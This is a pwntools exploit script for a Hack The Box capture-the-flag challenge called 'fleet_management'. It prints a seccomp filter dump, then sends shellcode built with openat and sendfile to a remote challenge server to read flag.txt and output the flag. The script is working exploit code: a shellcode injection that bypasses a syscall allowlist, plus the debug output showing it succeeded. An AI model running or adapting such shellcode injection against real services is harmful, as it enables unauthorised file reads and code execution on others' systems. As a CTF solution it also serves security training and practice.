'''
seccomp

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0006: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0010
 0007: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0010
 0008: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL

'''

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#io = process('./fleet_management')
ip, port = '165.227.231.233', 31102
io = remote(ip, port)

io.sendlineafter('[*] What do you want to do?', '9')
payload = asm(shellcraft.openat(-100, './flag.txt'))
#payload += asm(shellcraft.sendfile(1, 3, 0, 64))    #in_fd may need to try...
payload += asm(shellcraft.sendfile(1, 5, 0, 64))
io.sendline(payload)
print io.recvall()
'''
+] Receiving all data: Done (30B)
[DEBUG] Received 0x1d bytes:
    'HTB{sh3llc0d3_45_4_b4ckd00r}\n'
[*] Closed connection to 165.227.231.233 port 31102
 HTB{sh3llc0d3_45_4_b4ckd00r}
'''
